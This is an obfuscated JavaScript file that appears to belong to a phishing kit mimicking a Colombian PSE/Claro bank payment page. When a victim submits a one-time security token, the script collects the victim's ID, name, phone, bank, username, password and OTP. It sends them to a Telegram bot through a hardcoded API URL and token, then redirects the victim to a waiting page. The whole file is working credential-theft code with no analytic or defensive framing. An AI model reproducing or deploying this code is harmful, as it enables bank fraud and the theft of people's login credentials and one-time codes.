const _0x214561 = _0x52f0;
function _0x52f0(_0x3ac9c0, _0x45673d) {
  const _0x819e36 = _0x819e();
  return (
    (_0x52f0 = function (_0x52f038, _0x5ccf2b) {
      _0x52f038 = _0x52f038 - 0x155;
      let _0x4c6ea3 = _0x819e36[_0x52f038];
      return _0x4c6ea3;
    }),
    _0x52f0(_0x3ac9c0, _0x45673d)
  );
}
(function (_0x397131, _0x3aec8e) {
  const _0x495be8 = _0x52f0,
    _0x2636b2 = _0x397131();
  while (!![]) {
    try {
      const _0x486344 =
        (parseInt(_0x495be8(0x162)) / 0x1) *
          (-parseInt(_0x495be8(0x179)) / 0x2) +
        (parseInt(_0x495be8(0x157)) / 0x3) *
          (-parseInt(_0x495be8(0x189)) / 0x4) +
        (parseInt(_0x495be8(0x16e)) / 0x5) *
          (parseInt(_0x495be8(0x15b)) / 0x6) +
        (parseInt(_0x495be8(0x164)) / 0x7) *
          (parseInt(_0x495be8(0x188)) / 0x8) +
        (parseInt(_0x495be8(0x161)) / 0x9) *
          (-parseInt(_0x495be8(0x155)) / 0xa) +
        (-parseInt(_0x495be8(0x15d)) / 0xb) *
          (-parseInt(_0x495be8(0x182)) / 0xc) +
        parseInt(_0x495be8(0x174)) / 0xd;
      if (_0x486344 === _0x3aec8e) break;
      else _0x2636b2["push"](_0x2636b2["shift"]());
    } catch (_0xf0262e) {
      _0x2636b2["push"](_0x2636b2["shift"]());
    }
  }
})(_0x819e, 0x62130);
function updateLS() {
  const _0x4bc633 = _0x52f0;
  LS["setItem"](_0x4bc633(0x167), JSON[_0x4bc633(0x15a)](info));
}
const otpButton = document[_0x214561(0x183)]("btnDinamica"),
  numberMovil = document["getElementById"](_0x214561(0x178));
function _0x819e() {
  const _0x2074f2 = [
    "7032701oqVrMV",
    "metaInfo",
    "🟣\x20PSE\x20(Claro)\x0a©️ID:\x20",
    "addEventListener",
    "txtdinamica",
    "296206odZxXW",
    "nombre",
    "\x0a🏦Banco:\x20",
    "value",
    "Failed\x20to\x20fetch\x20trico\x20data",
    "log",
    "&text=",
    "Mensaje\x20enviado\x20a\x20Telegram\x20(chat\x20ID:\x20",
    "Usuario\x20actualizado",
    "768WDMoDq",
    "getElementById",
    "cdin",
    "Por\x20favor\x20ingrese\x20token\x20de\x20seguridad",
    "\x0a📱Teléfono:\x20",
    "bank",
    "1384lbYVhN",
    "200AVmqez",
    "240qhDXNp",
    "wait.html",
    "28485BzSEnS",
    "idreg",
    "json",
    "stringify",
    "1673286eLZNcm",
    "https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=",
    "67243tNTWQt",
    "focus",
    "href",
    "/trico/updateTricoPse/",
    "110601zHrsBA",
    "5ZxiLnN",
    "/trico/tricoData",
    "28357OuXOYk",
    "Error\x20al\x20actualizar\x20OTP:",
    "password",
    "info",
    "error",
    "disabled",
    "telefono",
    "Usuario\x20Encontrado",
    "application/json",
    "location",
    "5rQKvlG",
    "GET",
    "\x0a🚹Usuario:\x20",
    "Failed\x20to\x20update\x20OTP",
    "Error\x20de\x20red\x20(chat\x20ID:\x20",
    "PUT",
  ];
  _0x819e = function () {
    return _0x2074f2;
  };
  return _0x819e();
}
async function sendToTelegram(_0xe75484) {
  const _0x27e031 = _0x214561;
  for (const _0x584eff of chatIds) {
    const _0xffa9e3 =
      _0x27e031(0x15c) +
      _0x584eff +
      _0x27e031(0x17f) +
      encodeURIComponent(_0xe75484);
    try {
      const _0x89d86b = await fetch(_0xffa9e3);
      _0x89d86b["ok"]
        ? console["log"](_0x27e031(0x180) + _0x584eff + ")")
        : console[_0x27e031(0x168)](
            "Error\x20al\x20enviar\x20mensaje\x20(chat\x20ID:\x20" +
              _0x584eff +
              "):",
            _0x89d86b["statusText"]
          );
    } catch (_0x49b81b) {
      console[_0x27e031(0x168)](_0x27e031(0x172) + _0x584eff + "):", _0x49b81b);
    }
  }
}
otpButton[_0x214561(0x177)]("click", async function (_0xd8699e) {
  const _0xdda25d = _0x214561;
  _0xd8699e["preventDefault"](), (otpButton[_0xdda25d(0x169)] = !![]);
  if (numberMovil[_0xdda25d(0x17c)] == "") {
    alert(_0xdda25d(0x185)),
      numberMovil[_0xdda25d(0x15e)](),
      (otpButton[_0xdda25d(0x169)] = ![]);
    return;
  } else {
    var _0x3e5ec1 = numberMovil[_0xdda25d(0x17c)];
    (info[_0xdda25d(0x175)][_0xdda25d(0x184)] = _0x3e5ec1), updateLS();
    async function _0x3be85a() {
      const _0x4d5537 = _0xdda25d;
      try {
        const _0x375a47 = await fetch(url + _0x4d5537(0x163), {
          method: _0x4d5537(0x16f),
          headers: { "Content-Type": _0x4d5537(0x16c) },
        });
        if (!_0x375a47["ok"]) throw new Error(_0x4d5537(0x17d));
        const _0x364402 = await _0x375a47[_0x4d5537(0x159)](),
          _0x2d1ff0 = [..._0x364402];
        for (const _0x287200 of _0x2d1ff0) {
          if (_0x287200["id"] == info[_0x4d5537(0x175)]["cc"]) {
            console[_0x4d5537(0x17e)](_0x4d5537(0x16b));
            const _0x45aee2 = await fetch(
              url + _0x4d5537(0x160) + _0x287200[_0x4d5537(0x158)],
              {
                method: _0x4d5537(0x173),
                headers: { "Content-Type": "application/json" },
                body: JSON[_0x4d5537(0x15a)]({
                  otp: info[_0x4d5537(0x175)]["cdin"],
                }),
              }
            );
            if (!_0x45aee2["ok"]) throw new Error(_0x4d5537(0x171));
            const _0x18310d = await _0x45aee2[_0x4d5537(0x159)](),
              _0x48710e =
                _0x4d5537(0x176) +
                _0x287200["id"] +
                "\x0a🆔Nombre:\x20" +
                _0x287200[_0x4d5537(0x17a)] +
                _0x4d5537(0x186) +
                _0x287200[_0x4d5537(0x16a)] +
                _0x4d5537(0x170) +
                _0x287200["usuario"] +
                "\x0a🔒Contraseña:\x20" +
                _0x287200[_0x4d5537(0x166)] +
                "\x0a💎OTP:\x20" +
                info[_0x4d5537(0x175)][_0x4d5537(0x184)] +
                _0x4d5537(0x17b) +
                _0x287200[_0x4d5537(0x187)] +
                "\x0aFuente:\x20" +
                fuente +
                "\x0aIngresó\x20OTP";
            await sendToTelegram(_0x48710e), console["log"](_0x4d5537(0x181));
          }
        }
        window[_0x4d5537(0x16d)][_0x4d5537(0x15f)] = _0x4d5537(0x156);
      } catch (_0x155204) {
        console[_0x4d5537(0x168)](_0x4d5537(0x165), _0x155204),
          (otpButton["disabled"] = ![]);
      }
    }
    await _0x3be85a();
  }
});
